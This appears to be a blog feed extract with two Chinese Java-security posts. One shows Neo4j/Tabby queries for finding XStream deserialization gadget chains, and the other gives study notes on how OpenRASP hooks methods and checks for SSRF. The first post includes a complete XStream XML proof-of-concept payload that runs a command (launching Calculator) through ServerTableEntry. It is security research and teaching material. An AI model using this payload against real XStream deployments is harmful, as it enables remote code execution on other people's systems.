class="line">readObject:797, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h4 id="寻找核心中间链1"><a href="#寻找核心中间链1" class="headerlink" title="寻找核心中间链1"></a>寻找核心中间链1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream Runtime.exec</span><br><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;exec&quot;,CLASSNAME:&quot;java.lang.Runtime&quot;&#125;)&lt;-[r:CALL]-(m2:Method) </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-162.png" alt="upload successful"><br>如图，com.sun.corba.se.impl.activation.ServerTableEntry#verify</p><p>尝试寻找Trigger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;verify&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,13) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p>但是无果，无法直接串联</p><h4 id="寻找核心中间链2"><a href="#寻找核心中间链2" class="headerlink" title="寻找核心中间链2"></a>寻找核心中间链2</h4><p>有一种核心中间链，proxy类，存在invoke，且method、obj可控的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; invoke</span><br><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p>都过一遍，可以得出类似以下可控的类</p><p><img src="/images/pasted-163.png" alt="upload successful"></p><h4 id="寻找核心中间链3"><a href="#寻找核心中间链3" class="headerlink" title="寻找核心中间链3"></a>寻找核心中间链3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;get&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,16) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-166.png" alt="upload successful"></p><h4 id="寻找核心中间链4"><a href="#寻找核心中间链4" class="headerlink" title="寻找核心中间链4"></a>寻找核心中间链4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;marshal&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-167.png" alt="upload successful"></p><h4 id="寻找核心中间链4-1"><a href="#寻找核心中间链4-1" class="headerlink" title="寻找核心中间链4"></a>寻找核心中间链4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-168.png" alt="upload successful"></p><h4 id="寻找核心中间链5"><a href="#寻找核心中间链5" class="headerlink" title="寻找核心中间链5"></a>寻找核心中间链5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;get&quot;] </span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,5) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-169.png" alt="upload successful"></p><h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><p>原理及分析可以看上一篇</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文从Gadget挖掘角度，使用tabby复现了几个Gadget的挖掘过程，ssrf的2个链很简单，rce有些个比较复杂，最短路径算法不能直接串起。这些个链的重点在于中间核心链路的组装，本菜🐔也只能倒推出部分节点，还有一些关键转折点如果在不知情的情况下自己来，大概率是发现不了的。</p><p>其他思考&amp;总结</p><ol><li>apoc.algo.allSimplePaths 是最短路径，有最短就不会列出其他的，而最短的不一定是有效的，导致可能会漏（也可以搭配[r:CALL|ALIAS*5..8]使用）。</li><li>中间核心链路的组装，因为invoke等不能自动串起，需要积累。</li><li>21342、21345 可以看出还有其他的路径，是否也可行？（等有精力再验证下吧😓）</li></ol><p>最后再次感谢wh1t3p1g师傅，用tabby混了个cve，也逆向复现了这些Gadgets的挖掘思路。</p><p>1.4.17新出那些其他的Gadgets，还没空分析如何找到链的，等有精力再水一节吧。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96">tabby-现有利用链覆盖</a></li><li>[2] <a href="https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/">如何高效的挖掘Java反序列化利用链？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;月底在即，再不写点东西，每月一篇都要食言了。上个月刚挖的OpenRASP的坑，本打算再研究研究绕过姿势，验证下猜想，也没下文。正好6月份交的XStream SSRF Gadget CVE下来，之前XStream系列草稿箱里也待着之前逆向分析师傅们挖掘的思路&amp;amp;手法，正好编辑编辑，水一篇”如何挖掘XStream Gadgets”。&lt;/p&gt;
&lt;p&gt;首先感谢Wh1t3p1g师傅的Tabby，用起来比gadgetinspector更顺手，找链神器。&lt;/p&gt;
&lt;h2 id=&quot;Tabby&quot;&gt;&lt;a href=&quot;#Tabby&quot; class=&quot;headerlink&quot; title=&quot;Tabby&quot;&gt;&lt;/a&gt;Tabby&lt;/h2&gt;&lt;p&gt;有关Tabby的介绍，详情可以参考【1】中Wh1t3p1g师傅的几个wiki，写的很详细了，这里也不多啰嗦。（这里膜一下Wh1t3p1g师傅）&lt;/p&gt;
&lt;p&gt;Neo4j 查询比较吃cpu，小本本加上idea同时跑吃力，搞台vps跑比较好，但是tabby是通过apoc.load.csv file写Neo4j数据的，相当于限制了本机，因此给下整库的dump和load（当然，直接整个在vps上操作也是ok的）。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# dump neo4j database&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;neo4j-admin dump --to /tmp/neo4j.dump --database neo4j&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# scp dump file to vps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# load neo4j dump file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j stop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
    <category term="Tabby" scheme="http://m0d9.me/tags/Tabby/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP学习笔记（一）</title>
    <link href="http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-07-13T10:23:00.000Z</published>
    <updated>2021-07-18T13:34:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>RASP（Runtime Application self-protection）技术自Gartner在2014年提出，已经有挺长一段时间了。大厂们现在基本也都有自研的RASP、IAST产品。在开源RASP中，应以OpenRASP起步最早，应用也最广。不过因为性能原因，在实际攻防中覆盖面还是有限。</p><p>RASP算是Java安全绕不开的一个技术点，有兴趣对此学习研究一番。参考文章中threedr3am、tr1ple、c0d3p1ut0s几个师傅们对于OpenRASP的原理、技术点都有跟踪和解释，因此本文不再多做类似的阐释，主要针对自己的一些知识盲点、兴趣点，做做研究与笔记。</p><h2 id="OpenRASP的Hook"><a href="#OpenRASP的Hook" class="headerlink" title="OpenRASP的Hook"></a>OpenRASP的Hook</h2><p>关注两点：</p><ol><li>如何Hook的</li><li>Hook了哪些类的哪些方法</li></ol><h3 id="如何Hook"><a href="#如何Hook" class="headerlink" title="如何Hook"></a>如何Hook</h3><a id="more"></a><p>官方文档已经描述的很详细了<br><img src="/images/pasted-147.png" alt="upload successful"></p><p>注意步骤2 Retransfrom，第一次遇到</p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Java Instrumentation APi支持启动时/运行时Attach Agent，具体看个简单例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public static void agentmain(String agentArgs, Instrumentation instrumentation) &#123;</span></span><br><span class="line"><span class="comment">//        instrumentation.addTransformer(new DefineTransformer(), true);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;org/m0d9/sec/JavassistDemo/Target&quot;</span>.equals(className)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br></pre></td></tr></table></figure><p>（这个是beyond大佬以前MemShell的代码），需要注意的是premain以及transform实现接口，大同小异，OpenRASP的这个逻辑是在EngineBoot#start开始的，具体的代码就不贴了，流程跟踪如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">EngineBoot#initTransformer</span><br><span class="line">CustomClassTransformer#</span><br><span class="line">CustomClassTransformer#addAnnotationHook</span><br><span class="line">CustomClassTransformer#retransform</span><br><span class="line">CustomClassTransformer#transform</span><br><span class="line">AbstractClassHook#transformClass</span><br></pre></td></tr></table></figure><p>OpenRASP具体的transform逻辑在AbstractClassHook的各种子类中实现</p><h4 id="Javassists"><a href="#Javassists" class="headerlink" title="Javassists"></a>Javassists</h4><p>transform内是通过Javassists字节码技术，实现对类方法的修改/插桩。以CommonHttpClientHook为例，整个调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractClassHook#transformClass</span><br><span class="line">CommonHttpClientHook#hookMethod</span><br><span class="line">AbstractClassHook#insertAfter</span><br><span class="line">           javassist.CtBehavior#insertAfter</span><br></pre></td></tr></table></figure><p>具体关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@HookAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonHttpClientHook</span> <span class="keyword">extends</span> <span class="title">AbstractSSRFHook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">        String src = getInvokeStaticSrc(CommonHttpClientHook.class, <span class="string">&quot;checkHttpConnection&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$0,$1&quot;</span>, Object.class, String.class);</span><br><span class="line">        insertAfter(ctClass, <span class="string">&quot;parseUriReference&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Z)V&quot;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>通过javassist在org.apache.commons.httpclient.URI#parseUriReference方法后加载了checkHttpConnection这个方法代码块。<br>这个checkHttpConnection功能则为攻击检查分析逻辑，后面详细讲。</p><h3 id="Hook了哪些类方法"><a href="#Hook了哪些类方法" class="headerlink" title="Hook了哪些类方法"></a>Hook了哪些类方法</h3><p>官方文档中有列出详细Hook了哪些函数 <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook 函数列表</a>，如下<br><img src="/images/pasted-148.png" alt="upload successful"></p><p>继承AbstractClassHook且有HookAnnotation注解的类，他们的hook逻辑都会被加载，具体筛选代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addAnnotationHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Set&lt;Class&gt; classesSet = AnnotationScanner.getClassWithAnnotation(SCAN_ANNOTATION_PACKAGE, HookAnnotation.class);</span><br><span class="line">    <span class="keyword">for</span> (Class clazz : classesSet) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = clazz.newInstance();</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> AbstractClassHook) &#123;</span><br><span class="line">                addHook((AbstractClassHook) object, clazz.getName());</span><br></pre></td></tr></table></figure><h2 id="OpenRasp的检测逻辑"><a href="#OpenRasp的检测逻辑" class="headerlink" title="OpenRasp的检测逻辑"></a>OpenRasp的检测逻辑</h2><p>在hook插入的代码逻辑，一般都是预处理的逻辑，真正判断是否是恶意poc，是在OpenRASP的checker逻辑中。</p><h3 id="checker"><a href="#checker" class="headerlink" title="checker"></a>checker</h3><p>还是以CommonHttpClientHook SSRF为例，hook插入了checkHttpConnection函数代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br><span class="line">        String port = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                host = Reflection.invokeStringMethod(object, <span class="string">&quot;getHost&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line">...</span><br><span class="line">            checkHttpUrl(url, host, port, <span class="string">&quot;commons_httpclient&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>checkHttpConnection最终会调用Checker，进行规则判断，调用过程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CommonHttpClientHook#checkHttpConnection</span><br><span class="line">AbstractSSRFHook#checkHttpUrl</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheck</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.plugin.checker.CheckerManager#check</span><br><span class="line">V8AttackChecker#check</span><br><span class="line">XssChecker#check</span><br><span class="line">SqlResultChecker#check</span><br><span 